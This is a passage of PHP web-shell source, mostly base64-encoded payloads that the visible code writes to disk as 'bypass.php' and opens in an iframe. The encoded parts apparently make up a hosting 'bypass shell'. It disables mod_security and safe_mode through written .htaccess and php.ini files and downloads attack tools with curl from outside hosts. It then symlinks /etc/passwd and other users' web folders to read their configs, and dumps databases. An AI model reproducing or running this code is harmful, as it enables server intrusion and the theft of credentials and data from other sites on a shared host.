RsZFcyRXRaa0V0UmpBdE9WMHBMM0JoWTJzb0lrTWlMQ0JvWlhnb0pERXBLUzlsWnpzS0lDQWtkbUZzZFdVZ1BYNGdkSEl2S3k4Z0x6c0tJQ0FrZG1Gc2RXVWdQWDRnY3k4bEtGdGhMV1pCTFVZd0xUbGRXMkV0WmtFdFJqQXRPVjBwTDNCaFkyc29Ja01pTENCb1pYZ29KREVwS1M5bFp6c0tJQ0FrUms5U1RYc2tibUZ0WlgwZ1BTQWtkbUZzZFdVN0NuMEthV1lnS0NSR1QxSk5lM0JoYzNOOUlHVnhJQ0lpS1hzS2NISnBiblFnSndvOFltOWtlU0JqYkdGemN6MGlibVYzVTNSNWJHVXhJaUJpWjJOdmJHOXlQU0lqTURBd01EQXdJajRLUEhOd1lXNGdjM1I1YkdVOUluUmxlSFF0WkdWamIzSmhkR2x2YmpvZ2JtOXVaU0krUEdadmJuUWdZMjlzYjNJOUlpTXdNRVpHTURBaVBuTjViV3hxYm1zZ1lXeHNJR052Ym1acFp6d3ZabTl1ZEQ0OEwzTndZVzQrUEM5aFBpQUtQR1p2Y20wZ2JXVjBhRzlrUFNKd2IzTjBJajRLUEhSbGVIUmhjbVZoSUc1aGJXVTlJbkJoYzNNaUlITjBlV3hsUFNKaWIzSmtaWEk2TVhCNElHUnZkSFJsWkNBak1EQkdSa1pHT3lCM2FXUjBhRG9nTlRRemNIZzdJR2hsYVdkb2REb2dOREl3Y0hnN0lHSmhZMnRuY205MWJtUXRZMjlzYjNJNkl6QkRNRU13UXpzZ1ptOXVkQzFtWVcxcGJIazZWR0ZvYjIxaE95Qm1iMjUwTFhOcGVtVTZPSEIwT3lCamIyeHZjam9qTURCR1JrWkdJaUFnUGp3dmRHVjRkR0Z5WldFK1BHSnlJQzgrQ2ladVluTndPenh3UGdvOGFXNXdkWFFnYm1GdFpUMGlkR0Z5SWlCMGVYQmxQU0owWlhoMElpQnpkSGxzWlQwaVltOXlaR1Z5T2pGd2VDQmtiM1IwWldRZ0l6QXdSa1pHUmpzZ2QybGtkR2c2SURJeE1uQjRPeUJpWVdOclozSnZkVzVrTFdOdmJHOXlPaU13UXpCRE1FTTdJR1p2Ym5RdFptRnRhV3g1T2xSaGFHOXRZVHNnWm05dWRDMXphWHBsT2pod2REc2dZMjlzYjNJNkl6QXdSa1pHUmpzZ0lpQWdMejQ4WW5JZ0x6NEtKbTVpYzNBN1BDOXdQZ284Y0Q0S1BHbHVjSFYwSUc1aGJXVTlJbE4xWW0xcGRERWlJSFI1Y0dVOUluTjFZbTFwZENJZ2RtRnNkV1U5SWtkbGRDQkRiMjVtYVdjaUlITjBlV3hsUFNKaWIzSmtaWEk2TVhCNElHUnZkSFJsWkNBak1EQkdSa1pHT3lCM2FXUjBhRG9nT1RrN0lHWnZiblF0Wm1GdGFXeDVPbFJoYUc5dFlUc2dabTl1ZEMxemFYcGxPakV3Y0hRN0lHTnZiRzl5T2lNd01FWkdSa1k3SUhSbGVIUXRkSEpoYm5ObWIzSnRPblZ3Y0dWeVkyRnpaVHNnYUdWcFoyaDBPakl6T3lCaVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lNd1F6QkRNRU1pSUM4K1BDOXdQZ284TDJadmNtMCtKenNLZldWc2MyVjdDa0JzYVc1bGN5QTlQQ1JHVDFKTmUzQmhjM045UGpzS0pIa2dQU0JBYkdsdVpYTTdDbTl3Wlc0Z0tFMVpSa2xNUlN3Z0lqNTBZWEl1ZEcxd0lpazdDbkJ5YVc1MElFMVpSa2xNUlNBaWRHRnlJQzFqZW1ZZ0lpNGtSazlTVFh0MFlYSjlMaUl1ZEdGeUlDSTdDbVp2Y2lBb0pHdGhQVEE3Skd0aFBDUjVPeVJyWVNzcktYc0tkMmhwYkdVb1FHeHBibVZ6V3lScllWMGdJRDErSUcwdktDNHFQeWs2ZURvdlp5bDdDaVpzYVd3b0pERXBPd3B3Y21sdWRDQk5XVVpKVEVVZ0pERXVJaTUwZUhRZ0lqc0tabTl5S0NSclpEMHhPeVJyWkR3eE9Ec2thMlFyS3lsN0NuQnlhVzUwSUUxWlJrbE1SU0FrTVM0a2EyUXVJaTUwZUhRZ0lqc0tmUXA5Q2lCOUNuQnlhVzUwSnp4aWIyUjVJR05zWVhOelBTSnVaWGRUZEhsc1pURWlJR0puWTI5c2IzSTlJaU13TURBd01EQWlQZ284Y0Q1RWIyNWxJQ0VoUEM5d1BnbzhjRDRtYm1KemNEczhMM0ErSnpzS2FXWW9KRVpQVWsxN2RHRnlmU0J1WlNBaUlpbDdDbTl3Wlc0b1NVNUdUeXdnSW5SaGNpNTBiWEFpS1RzS1FHeHBibVZ6SUQwOFNVNUdUejRnT3dwamJHOXpaU2hKVGtaUEtUc0tjM2x6ZEdWdEtFQnNhVzVsY3lrN0NuQnlhVzUwSnp4d1BqeGhJR2h5WldZOUlpY3VKRVpQVWsxN2RHRnlmUzRuTG5SaGNpSStQR1p2Ym5RZ1kyOXNiM0k5SWlNd01FWkdNREFpUGdvOGMzQmhiaUJ6ZEhsc1pUMGlkR1Y0ZEMxa1pXTnZjbUYwYVc5dU9pQnViMjVsSWo1RGJHbGpheUJJWlhKbElGUnZJRVJ2ZDI1c2IyRmtJRlJoY2lCR2FXeGxQQzl6Y0dGdVBqd3ZabTl1ZEQ0OEwyRStQQzl3UGljN0NuMEtmUW9nY0hKcGJuUWlDand2WW05a2VUNEtQQzlvZEcxc1BpSTcNCic7DQoNCiRmaWxlID0gZm9wZW4oImNvbmZpZy5pem8iICwidysiKTsNCiR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJGNvbmZpZ3NoZWxsKSk7DQpmY2xvc2UoJGZpbGUpOw0KICAgIGNobW9kKCJjb25maWcuaXpvIiwwNzU1KTsNCiAgIGVjaG8gIjxpZnJhbWUgc3JjPWFsbGNvbmZpZy9jb25maWcuaXpvIHdpZHRoPTEwMCUgaGVpZ2h0PTEwMCUgZnJhbWVib3JkZXI9MD48L2lmcmFtZT4gIjsNCn0NCmlmIChpc3NldCgkX1BPU1RbJ1N1Ym1pdDE1J10pKQ0Kew0KICAgIG1rZGlyKCdieXBhc3NiaW4nLCAwNzU1KTsNCiAgICBjaGRpcignYnlwYXNzYmluJyk7DQoNCkBleGVjKCdjdXJsIGh0dHA6Ly9kbC5kcm9wYm94LmNvbS91Lzc0NDI1MzkxL2J5cGFzcy50YXIuZ3ogLW8gYnlwYXNzLnRhci5neicpOw0KQGV4ZWMoJ3RhciAteHZmIGJ5cGFzcy50YXIuZ3onKTsNCkBleGVjKCdjaG1vZCA3NTUgLi9ieXBhc3MvbG4nKTsNCkBleGVjKCcuL2J5cGFzcy9sbiAtcyAvZXRjL3Bhc3N3ZCAxLnBocCcpOw0KICAgZWNobyAiPGlmcmFtZSBzcmM9YnlwYXNzYmluLzEucGhwIHdpZHRoPTEwMCUgaGVpZ2h0PTEwMCUgZnJhbWVib3JkZXI9MD48L2lmcmFtZT4gIjsNCn0NCg0KaWYgKGlzc2V0KCRfUE9TVFsnU3VibWl0MTYnXSkpDQp7DQpAbWtkaXIoIm15c3FsZHVtcGVyIik7DQpAY2hkaXIoIm15c3FsZHVtcGVyIik7DQpAZXhlYygnY3VybCBodHRwOi8vZGwuZHJvcGJveC5jb20vdS83NDQyNTM5MS9teXNxbGR1bXBlci50YXIuZ3ogLW8gbXlzcWxkdW1wZXIudGFyLmd6Jyk7DQpAZXhlYygndGFyIC14dmYgbXlzcWxkdW1wZXIudGFyLmd6Jyk7DQoJZWNobyAiPGlmcmFtZSBzcmM9bXlzcWxkdW1wZXIvaW5kZXgucGhwIHdpZHRoPTEwMCUgaGVpZ2h0PTEwMCUgZnJhbWVib3JkZXI9MD48L2lmcmFtZT4gIjsNCn0NCj8+DQoNCiAgICAgICAgPHRkIGNsYXNzPSd0ZCcgc3R5bGU9J2JvcmRlci1ib3R0b20td2lkdGg6dGhpbjtib3JkZXItdG9wLXdpZHRoOnRoaW4nPjxmb3JtIG5hbWU9J0YxJyBtZXRob2Q9J3Bvc3QnPg0KICAgICAgICAgICAgPGRpdiBhbGlnbj0nbGVmdCc+DQoJCQkgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J1N1Ym1pdDE0JyB2YWx1ZT0nIENyZWF0IFB5dGhvbiAgJz4NCgkJCSAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nU3VibWl0MTMnIHZhbHVlPScgQ3JlYXQgIENnaSAgICAnPg0KICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdTdWJtaXQxMScgdmFsdWU9JzEuU3ltIEFsbCBDb25maWcnPg0KCQkJICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdTdWJtaXQ3JyB2YWx1ZT0nMi5IdGFjY2VzcyBBbGwgQ29uZmlnJz4NCgkJCSAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nU3VibWl0MTUnIHZhbHVlPScgL2V0Yy9wYXNzd2QgICAnPg0KCQkJICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdTdWJtaXQxNicgdmFsdWU9JyBNeSBTUUwgRHVtcGVyICc+DQoJCQkgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J1N1Ym1pdDEwJyB2YWx1ZT0ndGFyIC14dmYgU3ltLnRhcic+DQoJCQkgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J1N1Ym1pdDEyJyB2YWx1ZT0nMS5TeW0gTGluayBVc2VyICc+DQoJCQkgICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdTdWJtaXQ5JyB2YWx1ZT0nMi5IdGFjY2VzcyBMaXN0ICc+DQoJCQkgICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdTdWJtaXQ4JyB2YWx1ZT0nMy5IdGFjY2VzcyBFbXB0eSc+DQoJCQkgIDwvZm9ybT4NCiAgICA8L3RkPg0KICAgDQo8L2JvZHk+DQo8L2h0bWw+';
        $file       = fopen("bypass.php", "w+");
        $write      = fwrite($file, base64_decode($perltoolss));
        fclose($file);
        echo "<iframe src=bypass.php width=100% height=720px frameborder=0></iframe> ";
 }elseif ($action == 'bypass2') {
        $file       = fopen($dir . "bypass2.php", "w+");
        $perltoolss = 'PCFET0NUWVBFIEhUTUwgUFVCTElDICctLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTicgJ2h0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCc+DQo8aHRtbD4NCg0KPC9odG1sPg0KPGh0bWw+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9J0NvbnRlbnQtVHlwZScgY29udGVudD0ndGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTEnPg0KPHRpdGxlPnx8IFd3Vy5UdXJrZXlTZWN1cml0eS5Pcmd8fCBTZW5kZSBHZWwgQmFiYW5hLi1fLSAmIGl6byA6OjwvdGl0bGU+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KYSB7IA0KdGV4dC1kZWNvcmF0aW9uOm5vbmU7DQpjb2xvcjp3aGl0ZTsNCiB9DQo8L3N0eWxlPiANCjxzdHlsZT4NCmlucHV0IHsgDQpjb2xvcjojMDAwMDM1OyANCmZvbnQ6OHB0ICd0cmVidWNoZXQgbXMnLGhlbHZldGljYSxzYW5zLXNlcmlmOw0KfQ0KLkRJUiB7IA0KY29sb3I6IzAwMDAzNTsgDQpmb250OmJvbGQgOHB0ICd0cmVidWNoZXQgbXMnLGhlbHZldGljYSxzYW5zLXNlcmlmO2NvbG9yOiNGRkZGRkY7DQpiYWNrZ3JvdW5kLWNvbG9yOiNBQTAwMDA7DQpib3JkZXItc3R5bGU6bm9uZTsNCn0NCi50eHQgeyANCmNvbG9yOiMyQTAwMDA7IA0KZm9udDpib2xkICA4cHQgJ3RyZWJ1Y2hldCBtcycsaGVsdmV0aWNhLHNhbnMtc2VyaWY7DQp9IA0KYm9keSwgdGFibGUsIHNlbGVjdCwgb3B0aW9uLCAuaW5mbw0Kew0KZm9udDpib2xkICA4cHQgJ3RyZWJ1Y2hldCBtcycsaGVsdmV0aWNhLHNhbnMtc2VyaWY7DQp9DQpib2R5IHsNCgliYWNrZ3JvdW5kLWNvbG9yOiAjRTVFNUU1Ow0KfQ0KLnN0eWxlMSB7Y29sb3I6ICNBQTAwMDB9DQoudGQNCnsNCmJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7DQpib3JkZXItdG9wOiAwcHg7DQpib3JkZXItbGVmdDogMHB4Ow0KYm9yZGVyLXJpZ2h0OiAwcHg7DQp9DQoudGRVUA0Kew0KYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsNCmJvcmRlci10b3A6IDFweDsNCmJvcmRlci1sZWZ0OiAwcHg7DQpib3JkZXItcmlnaHQ6IDBweDsNCmJvcmRlci1ib3R0b206IDFweDsNCn0NCi5zdHlsZTQge2NvbG9yOiAjRkZGRkZGOyB9DQo8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHk+DQo8P3BocA0KJGtva2Rvc3lhID0gIi5odGFjY2VzcyI7DQoNCiRkb3N5YV9hZGkgPSAiJGtva2Rvc3lhIjsNCiRkb3N5YSA9IGZvcGVuICgkZG9zeWFfYWRpICwgJ3cnKSBvciBkaWUgKCJEb3N5YSBhPz9sYW1hZD8hIik7DQokbWV0aW4gPSAiPElmTW9kdWxlIG1vZF9zZWN1cml0eS5jPg0KICAgIFNlY0ZpbHRlckVuZ2luZSBPZmYNCiAgICBTZWNGaWx0ZXJTY2FuUE9TVCBPZmYNCjwvSWZNb2R1bGU+IjsJDQpmd3JpdGUgKCAkZG9zeWEgLCAkbWV0aW4gKSA7DQpmY2xvc2UgKCRkb3N5YSk7IA0KDQoka29rZG9zeWEgPSAicGhwLmluaSI7DQoNCiRkb3N5YV9hZGkgPSAiJGtva2Rvc3lhIjsNCiRkb3N5YSA9IGZvcGVuICgkZG9zeWFfYWRpICwgJ3cnKSBvciBkaWUgKCJEb3N5YSBhPz9sYW1hZD8hIik7DQokbWV0aW4gPSAic2FmZV9tb2RlICAgICAgICAgID0gICAgICAgT0ZGDQpkaXNhYmxlX2Z1bmN0aW9ucyAgICAgICA9ICAgICAgICAgICAgTk9ORSI7CQ0KZndyaXRlICggJGRvc3lhICwgJG1ldGluICkgOw0KZmNsb3NlICgkZG9zeWEpOw0KDQojIFBIUCBWYXJpYWJsZXMgOjo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6OiBQSFAgVmFyaWFibGVzICMNCkZVTkNUSU9OIENvcHlTaGVsbGVyKCRESVIpIHsNCiRTaGVsbGVyID0gUm5kTmFtZSgpOw0KJFNIX1RYVCA9IChAJF9QT1NUWydzaGVsbGVyVVJMJ10pOw0KJGZpbGUyMyA9IChAZmlsZV9nZXRfY29udGVudHMoIiRTSF9UWFQiKSk7DQppZiAoISRmaWxlMjMpIHsNCmVjaG8gIjxmb250IGNvbG9yPXJlZD5bK10gQ2FuJ3QgT3BlbiBUaGUgU2hlbGxlciBGaWxlIC48L2ZvbnQ+PGJyPiI7DQp9DQplbHNlIHsNCiRmcDIzID0gQGZvcGVuKCIkRElSLyRTaGVsbGVyLnBocCIsJ3crJyk7DQokZncyMyA9IEBmd3JpdGUoJGZwMjMsJGZpbGUyMyk7DQppZiAoJGZ3MjMpIHsNCmVjaG8gIjxmb250IGNvbG9yPWdyZWVuPlsrXSBVcGxvYWRlZCBTdWNjZXNzZnVsIDogJERJUi8kU2hlbGxlci5waHA8L2ZvbnQ+PEJSPiI7DQp9DQpAZmNsb3NlKCRmcDIzKTsNCiB9DQp9DQpmdW5jdGlvbiBpc193aW5kb3dzKCkgeyByZXR1cm4gc3RydG9sb3dlcihzdWJzdHIoUEhQX09TLDAsMykpID09ICJ3aW4iOyB9DQokc2VydmVyPSRIVFRQX1NFUlZFUl9WQVJTWydTRVJWRVJfU09GVFdBUkUnXTsNCiRzYWZlX21vZGU9aW5pX2dldCgnc2FmZV9tb2RlJyk7DQokbXlzcWxfc3RhdD1mdW5jdGlvbl9leGlzdHMoJ215c3FsX2Nvbm5lY3QnKTsNCiRjdXJsX29uPWZ1bmN0aW9uX2V4aXN0cygnY3VybF92ZXJzaW9uJyk7DQokZGlzX2Z1bmM9aW5pX2dldCgnZGlzYWJsZV9mdW5jdGlvbnMnKTsNCmZ1bmN0aW9uIHN5c2luZm8oKQ0Kew0KIGdsb2JhbCAkY3VybF9vbiwgJGRpc19mdW5jLCAkbXlzcWxfc3RhdCwgJHNhZmVfbW9kZSwgJHNlcnZlciwgJEhUVFBfU0VSVkVSX1ZBUlM7DQogZWNobyAoKCRzYWZlX21vZGUpPygiU2FmZSBNb2RlOiA8L2I+PGZvbnQgY29sb3I9Z3JlZW4+T048L2ZvbnQ+PGI+ICIpOg0KICAgICAgICAgKCI8Qj5TYWZlIE1vZGU6IDwvYj48Zm9udCBjb2xvcj1yZWQ+T0ZGPC9mb250PjxiPiAiKSk7DQogJHJvd19kaXNfZnVuYz1leHBsb2RlKCcsICcsJGRpc19mdW5jKTsNCiBlY2hvICgiUEhQOiA8L2I+PGZvbnQgY29sb3I9Ymx1ZT4iLnBocHZlcnNpb24oKS4iPC9mb250PjxiPiAiKTsNCiBlY2hvICgiTXlTUUw6IDwvYj4iKTsNCiBpZigkbXlzcWxfc3RhdCl7DQogIGVjaG8gIjxmb250IGNvbG9yPWdyZWVuPk9OIDwvZm9udD48Yj4iOw0KIH0NCiBlbHNlIHsNCiAgZWNobyAiPGZvbnQgY29sb3I9cmVkPk9GRiA8L2ZvbnQ+PGI+IjsNCiB9DQogZWNobyAiY1VSTDogPC9iPiI7DQogaWYoJGN1cmxfb24pew0KICBlY2hvICI8Zm9udCBjb2xvcj1ncmVlbj5PTjwvZm9udD48Yj48YnI+IjsNCiB9ZWxzZQ0KICBlY2hvICI8Zm9udCBjb2xvcj1yZWQ+T0ZGPC9mb250PjxiPjxicj4iOw0KIGlmICgkZGlzX2Z1bmMhPSIiKXsNCiAgZWNobyAiRGlzYWJsZWQgRnVuY3Rpb25zIDogPC9iPjxmb250IGNvbG9yPXJlZD4iLiRkaXNfZnVuYy4iPC9mb250Pjxicj48Yj4iOw0KIH0NCiBlbHNlIHsNCiAgZWNobyAiRGlzYWJsZWQgRnVuY3Rpb25zIDogPC9iPjxmb250IGNvbG9yPWdyZWVuPk5vbmU8L2ZvbnQ+PGJyPjxiPiI7DQogfQ0KICR1bmFtZSA9IEBleGVjKCd1bmFtZSAtYScpOw0KIGVjaG8gIk9TOiA8L2I+PGZvbnQgY29sb3I9Ymx1ZT4iOw0KIGlmIChlbXB0eSgkdW5hbWUpKXsNCiAgZWNobyAocGhwX3VuYW1lKCkuIjwvZm9udD48YnI+PGI+Iik7DQogfWVsc2UNCiAgZWNobyAkdW5hbWUuIjwvZm9udD48YnI+PGI+IjsNCiAkaWQgPSBAZXhlYygnaWQnKTsNCiBlY2hvICJTRVJWRVI6IDwvYj48Zm9udCBjb2xvcj1ibHVlPiIuJHNlcnZlci4iPC9mb250Pjxicj48Yj4iOw0KIGVjaG8gIklEOiA8L2I+PGZvbnQgY29sb3I9Ymx1ZT4iOw0KIGlmICghZW1wdHkoJGlkKSl7DQogIGVjaG8gJGlkLiI8L2ZvbnQ+PGJyPjxiPiI7DQogfWVsc2UNCiAgZWNobyAidXNlcj0iLkBnZXRfY3VycmVudF91c2VyKCkuIiB1aWQ9Ii5AZ2V0bXl1aWQoKS4iIGdpZD0iLkBnZXRteWdpZCgpLg0KICAgICAgICI8L2ZvbnQ+PGJyPjxiPiI7DQogZWNobyAiPGI+UmVtb3RlQWRkcmVzczogPC9iPjxmb250IGNvbG9yPXJlZD4iLiRIVFRQX1NFUlZFUl9WQVJTWydSRU1PVEVfQUREUiddLiI8L2ZvbnQ+ICwgPGI+U2VydmVyOiA8L2I+PGZvbnQgY29sb3I9cmVkPiIuQGdldGhvc3RieW5hbWUoJF9TRVJWRVJbIkhUVFBfSE9TVCJdKS4iPC9mb250PiI7DQogaWYoaXNzZXQoJEhUVFBfU0VSVkVSX1ZBUlNbJ0hUVFBfWF9GT1JXQVJERURfRk9SJ10pKXsNCiAgZWNobyAiPGI+UmVtb3RlQWRkcmVzc0lmUHJveHk6IDwvYj48Zm9udCBjb2xvcj1yZWQ+Ii4kSFRUUF9TRVJWRVJfVkFSU1snSFRUUF9YX0ZPUldBUkRFRF9GT1InXS4iPC9mb250PiI7DQogfQ0KIGVjaG8gIjwvZm9udD48L2ZvbnQ+IjsNCn0NCmZ1bmN0aW9uIFJuZE5hbWUoKSB7DQokY29kZWxlbmdodCA9IDEwOw0Kd2hpbGUoQCRuZXdjb2RlX2xlbmd0aCA8ICRjb2RlbGVuZ2h0KSB7DQokeD0xOw0KJHk9MzsNCiRwYXJ0ID0gcmFuZCgkeCwkeSk7DQppZigkcGFydD09MSl7JGE9NDg7JGI9NTc7fQ0KaWYoJHBhcnQ9PTIpeyRhPTY1OyRiPTkwO30NCmlmKCRwYXJ0PT0zKXskYT05NzskYj0xMjI7fQ0KJGNvZGVfcGFydD1jaHIocmFuZCgkYSwkYikpOw0KKEAkbmV3Y29kZV9sZW5ndGggPSAkbmV3Y29kZV9sZW5ndGggKyAxKTsNCihAJG5ld2NvZGUgPSAkbmV3Y29kZS4kY29kZV9wYXJ0KTsNCn0NCnJldHVybiAkbmV3Y29kZTsNCn0NCiMgUEhQIFZhcmlhYmxlcyA6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6IFBIUCBWYXJpYWJsZXMgIw0KZWNobyAiPENFTlRFUj4NCiAgPHRhYmxlIGJvcmRlcj0nMScgY2VsbHBhZGRpbmc9JzAnIGNlbGxzcGFjaW5nPScwJyBzdHlsZT0nYm9yZGVyLWNvbGxhcHNlOiBjb2xsYXBzZTsgYm9yZGVyLXN0eWxlOiBzb2xpZDsgYm9yZGVyLWNvbG9yOiAjQzBDMEMwOyBwYWRkaW5nLWxlZnQ6IDQ7IHBhZGRpbmctcmlnaHQ6IDQ7IHBhZGRpbmctdG9wOiAxOyBwYWRkaW5nLWJvdHRvbTogMScgYm9yZGVyY29sb3I9JyMxMTExMTEnIHdpZHRoPSc4NiUnIGJnY29sb3I9JyNFMEUwRTAnPg0KICAgIDx0cj4NCiAgICAgIDx0ZCBiZ2NvbG9yPScjQUEwMDAwJyBjbGFzcz0ndGQnPjxkaXYgYWxpZ249J2NlbnRlcicgY2xhc3M9J3N0eWxlNCc+Rm9yYmlkZGVuIGFsIGJ5cGFzcyBzaGVsbDwvZGl2PjwvdGQ+DQogICAgPC90cj4NCiAgICA8dHI+DQogICAgICA8dGQgc3R5bGU9J3BhZGRpbmc6NXB4IDVweCA1cHggNXB4ICc+IjsNCgkgIGVjaG8gc3lzaW5mbygpOw0KZWNobyAiCSAgPC90ZD4NCiAgICA8L3RyPg0KICAgIDx0cj4NCiAgICAgIDx0ZCBiZ2NvbG9yPScjQUEwMDAwJyBjbGFzcz0ndGQnIHN0eWxlPSdwYWRkaW5nOjBweCAwcHggMHB4IDVweCc+PGRpdiBhbGlnbj0nY2VudGVyJyBjbGFzcz0nc3R5bGU0Jz4NCiAgICAgICAgPGRpdiBhbGlnbj0nbGVmdCc+DQogICAgICAgICAgPGZvcm0gbmFtZT0nZm9ybTQnIG1ldGhvZD0ncG9zdCcgYWN0aW9uPScnPg0KICAgICAgICAgICAgIFZpZXcgRGlyZWN0b3J5IDogDQogICAgICAgICAgICAgPGlucHV0IG5hbWU9J0dvRGlyJyB0eXBlPSd0ZXh0JyBjbGFzcz0nRElSJyBpZD0nR29EaXInIHNpemU9JzEyMCc+DQogICAgICAgICAgPC9mb3JtPg0KICAgICAgICA8L2Rpdj4NCiAgICAgIDwvZGl2PjwvdGQ+DQogICAgPC90cj4NCiAgICA8dHI+DQogICAgPHRkIHdpZHRoPScxMDAlJyBoZWlnaHQ9JzI4MCcgc3R5bGU9J3BhZGRpbmc6MjBweCAyMHB4IDIwcHggMjBweCAnPiI7DQoNCmlmIChpc3NldCgkX1BPU1RbJ1N1Ym1pdDInXSkpDQp7DQpAbWtkaXIoImJvbWJhIik7DQpAY2hkaXIoImJvbWJhIik7DQpAZXhlYygnY3VybCBodHRwOi8vdHVya2JsYWNraGF0cy5jb20vcHJpdi9sbi56aXAgLW8gbG4uemlwJyk7DQpAZXhlYygndW56aXAgbG4uemlwJyk7DQpAZXhlYygnY2htb2QgNzU1IGxuJyk7DQoNCmVjaG8gJzxmb250IGNvbG9yPWdyZWVuPlsrXSBEaXJlY3RvcnkgWyBib21iYSBdIENyZWF0ZWQgLjwvZm9udD48QnI+JzsNCmVjaG8gJzxmb250IGNvbG9yPWdyZWVuPlsrXSBEaXJlY3RvcnkgQ2hhbmdlZCAuPC9mb250PjxCcj4nOw0KJGZpbGUzID0gJ09wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rcw0KRGlyZWN0b3J5SW5kZXggc3Nzc3NzLmh0bQ0KQWRkVHlwZSB0eHQgLnBocA0KQWRkSGFuZGxlciB0eHQgLnBocCc7DQokZnAzID0gZm9wZW4oJy5odGFjY2VzcycsJ3cnKTsNCiRmdzMgPSBmd3JpdGUoJGZwMywkZmlsZTMpOw0KaWYgKCRmdzMpIHsNCmVjaG8gJzxmb250IGNvbG9yPWdyZWVuPlsrXSAuaHRhY2Nlc3MgRmlsZSBVcGxvYWRlZCAuPC9mb250PjxCUj4nOw0KfQ0KZWxzZSB7DQplY2hvICI8Zm9udCBjb2xvcj1yZWQ+WytdIE5vIFBlcm0gVG8gQ3JlYXRlIC5odGFjY2VzcyBGaWxlICE8L2ZvbnQ+PEJSPiI7DQp9DQpAZmNsb3NlKCRmcDMpOw0KJGxpbmVzMz1AZmlsZSgnL2V0Yy9wYXNzd2QnKTsNCmlmICghJGxpbmVzMykgew0KJGF1dGhwID0gQHBvcGVuKCIvYmluL2NhdCAvZXRjL3Bhc3N3ZCIsICJyIik7DQokaSA9IDA7DQp3aGlsZSAoIWZlb2YoJGF1dGhwKSkNCiRhcmVzdWx0WyRpKytdID0gZmdldHMoJGF1dGhwLCA0MDk2KTsNCiRsaW5lczMgPSAkYXJlc3VsdDsNCkBwY2xvc2UoJGF1dGhwKTsNCn0NCmlmICghJGxpbmVzMykgew0KZWNobyAiPGZvbnQgY29sb3I9cmVkPlsrXSBDYW4ndCBSZWFkIC9ldGMvcGFzc3dkIEZpbGUgLjwvZm9udD48QlI+IjsNCmVjaG8gIjxmb250IGNvbG9yPXJlZD5bK10gQ2FuJ3QgTWFrZSBUaGUgVXNlcnMgU2hvcnRjdXRzIC48L2ZvbnQ+PEJSPiI7DQplY2hvICc8Zm9udCBjb2xvcj1yZWQ+WytdIEZpbmlzaCAhPC9mb250PjxCUj4nOw0KfQ0KZWxzZSB7DQpmb3JlYWNoKCRsaW5lczMgYXMgJGxpbmVfbnVtMz0+JGxpbmUzKXsNCiRzcHJ0Mz1leHBsb2RlKCI6IiwkbGluZTMpOw0KJHVzZXIzPSRzcHJ0M1swXTsNCkBleGVjKCcuL2xuIC1zIC9ob21lLycuJHVzZXIzLicvcHVibGljX2h0bWwgJyAuICR1c2VyMyk7DQp9DQplY2hvICc8Zm9udCBjb2xvcj1ncmVlbj5bK10gVXNlcnMgU2hvcnRjdXQgQ3JlYXRlZCAuPC9mb250PjxCUj4nOw0KZWNobyAnPGZvbnQgY29sb3I9Z3JlZW4+WytdIEZpbmlzaCAhPC9mb250PjxCUj4nOw0KfQ0KfQ0KaWYgKGlzc2V0KCRfUE9TVFsnU3VibWl0MTInXSkpIHsNCkBta2RpcigiYm9tYmExIik7DQpAY2hkaXIoImJvbWJhMSIpOw0KZWNobyAnPGZvbnQgY29sb3I9Z3JlZW4+WytdIERpcmVjdG9yeSBbIGJvbWJhMSBdIENyZWF0ZWQgLjwvZm9udD48QnI+JzsNCmVjaG8gJzxmb250IGNvbG9yPWdyZWVuPlsrXSBEaXJlY3RvcnkgQ2hhbmdlZCAuPC9mb250PjxCcj4nOw0KJGZpbGUzID0gJ09wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cyBJbmRleGVzIEV4ZWNDR0kNCkFkZFR5cGUgYXBwbGljYXRpb24veC1odHRwZC1jZ2kgLmNpbg0KQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5jaW4NCkFkZEhhbmRsZXIgY2dpLXNjcmlwdCAuY2luJzsNCiRmcDMgPSBmb3BlbignLmh0YWNjZXNzJywndycpOw0KJGZ3MyA9IGZ3cml0ZSgkZnAzLCRmaWxlMyk7DQppZiAoJGZ3Mykgew0KZWNobyAnPG